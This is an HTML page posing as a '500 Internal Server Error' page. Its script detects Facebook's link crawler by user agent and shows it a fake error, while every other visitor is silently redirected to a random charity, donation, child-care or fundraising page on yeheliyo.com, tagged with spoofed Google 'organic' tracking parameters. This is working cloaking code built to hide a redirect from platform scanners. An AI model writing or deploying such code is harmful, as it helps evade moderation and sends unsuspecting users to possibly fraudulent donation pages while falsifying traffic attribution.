<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>500 Internal Server Error</title>
    <script>
        window.onload = function() {
            // Check the user agent
            const userAgent = navigator.userAgent;

            // Simulate checking for Facebook's crawler
            if (userAgent.includes('facebookexternalhit')) {
                // Simulate sending a 500 error response
                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
                return; // Stop further execution
            }

            // Otherwise, redirect to a random page
            const pages = [
                "https://yeheliyo.com/Jupiter/research/?utm_source=google&utm_medium=organic&utm_campaign=google_project",
                "https://yeheliyo.com/Jupiter/charity/?utm_source=google&utm_medium=organic&utm_campaign=google_redirect",
                "https://yeheliyo.com/Jupiter/child-care/?utm_source=google&utm_medium=organic&utm_campaign=google_redirect",
                "https://yeheliyo.com/Jupiter/donation/?utm_source=google&utm_medium=organic&utm_campaign=google_redirect",
                "https://yeheliyo.com/Jupiter/fundraising/?utm_source=google&utm_medium=organic&utm_campaign=google_redirect"
            ];
            const randomPage = pages[Math.floor(Math.random() * pages.length)];
            window.location.href = randomPage;
        };
    </script>
</head>
<body>
</body>
</html>
